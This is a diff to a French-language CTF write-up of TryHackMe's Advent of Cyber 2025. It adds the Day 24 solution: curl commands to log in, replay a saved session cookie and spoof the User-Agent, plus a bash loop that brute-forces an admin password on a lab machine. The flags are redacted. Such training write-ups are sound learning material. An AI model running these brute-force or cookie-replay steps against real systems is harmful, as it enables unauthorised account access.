@@ -35,6 +35,7 @@ Lien vers l'épreuve : <https://tryhackme.com/room/adventofcyber2025>
 * [Jour 21 : Malware Analysis - Malhare.exe](#jour-21--malware-analysis---malhareexe)
 * [Jour 22 : C2 Detection - Command \& Carol](#jour-22--c2-detection---command--carol)
 * [Jour 23 : AWS Security - S3cret Santa](#jour-23--aws-security---s3cret-santa)
+* [Jour 24 : Exploitation with cURL - Hoperation Eggsploit](#jour-24--exploitation-with-curl---hoperation-eggsploit)
 
 ## Jour 1 : [Linux CLI - *Shells Bells*](https://tryhackme.com/room/linuxcli-aoc2025-o1fpqkvxti)
 
@@ -3571,3 +3572,141 @@ THM{[...expurgé...]}
 
 {% endcapture %}
 {% include elements/spoil.html %}
+
+## Jour 24 : [Exploitation with cURL - Hoperation Eggsploit](https://tryhackme.com/room/webhackingusingcurl-aoc2025-w8q1a4s7d0)
+
+![AoC 2025 jour 24](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1764153637405.png)
+
+Le premier objectif consiste à se connecter sur l'endpoint `/post` avec les identifiants fournis. La commande correspondante pour lire les headers :
+
+```bash
+curl -i -X POST -d "username=admin&password=admin" http://10.80.150.67/post.php
+```
+
+{% capture spoil %}
+
+```http
+HTTP/1.1 200 OK
+Date: Wed, 24 Dec 2025 17:14:08 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 47
+Content-Type: text/html; charset=UTF-8
+
+Login successful!
+Flag: THM{[...expurgé...]}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+L'étape suivante consiste à obtenir, sauvegarder, et réutiliser un cookie sur l'endpoint `/cookie.php`.
+
+Pour obtenir le cookie, nous devons nous connecter de la même façon, en ajoutant le flag `-c` pour l'enregistrer dans un fichier.
+
+```bash
+curl -i -c cookie.txt -X POST -d "username=admin&password=admin" http://10.80.150.67/cookie.php
+```
+
+{% capture spoil %}
+
+```http
+HTTP/1.1 200 OK
+Date: Wed, 24 Dec 2025 17:19:24 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Set-Cookie: PHPSESSID=usdnguit27k3d1q84k1mutsea2; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 30
+Content-Type: text/html; charset=UTF-8
+
+Login successful. Cookie set.
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Pour réutiliser le cookie obtenu, nous rejouons la requête sur le même endpoint, mais cette fois sans l'option `-X POST` et en remplaçant le flag `-c` par `-b`
+
+```bash
+curl -i -b cookie.txt http://10.80.150.67/cookie.php
+```
+
+{% capture spoil %}
+
+```http
+HTTP/1.1 200 OK
+Date: Wed, 24 Dec 2025 17:21:51 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Content-Length: 54
+Content-Type: text/html; charset=UTF-8
+
+Welcome back, admin!
+Flag: THM{[...expurgé...]}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Pour l'étape de bruteforce, nous enregistrons la liste fournie sous le nom `wordlist.txt`, et le script de bruteforce suivant (le flag `-s` permet d'activer un mode silencieux : aucun retour n'est fait dans le terminal):
+
+```bash
+#!/bin/bash
+for pass in $(cat wordlist.txt); do
+  echo "Trying password: $pass"
+  response=$(curl -s -X POST -d "username=admin&password=$pass" http://10.80.150.67/bruteforce.php)
+  if echo "$response" | grep -q "Welcome"; then
+    echo "[+] Password found: $pass"
+    break
+  fi
+done
+```
+
+En lançant le script, nous obtenons le mot de passe du compte admin.
+
+```bash
+bash bruteforce.sh
+```
+
+{% capture spoil %}
+
+```txt
+Trying password: admin123
+Trying password: password
+Trying password: letmein
+Trying password: secretpass
+[+] Password found: [...expurgé...]
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+La dernière étape consiste à envoyer la valeur `TBFC` comme user-agent à la place de celui par défaut de curl : `curl/7.68.0` pour l'AttackBox. Le flag `-A` permet cette opération.
+
+```bash
+curl -i -A TBFC http://10.80.150.67/agent.php
+```
+
+{% capture spoil %}
+
+```http
+HTTP/1.1 200 OK
+Date: Wed, 24 Dec 2025 17:32:09 GMT
+Server: Apache/2.4.52 (Ubuntu)
+Content-Length: 38
+Content-Type: text/html; charset=UTF-8
+
+Flag: THM{[...expurgé...]}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+### Bonus <!-- omit in toc -->
+
+<details><summary>Pas de solution pour l'instant</summary>
+<div markdown = "1">
+</div></details>
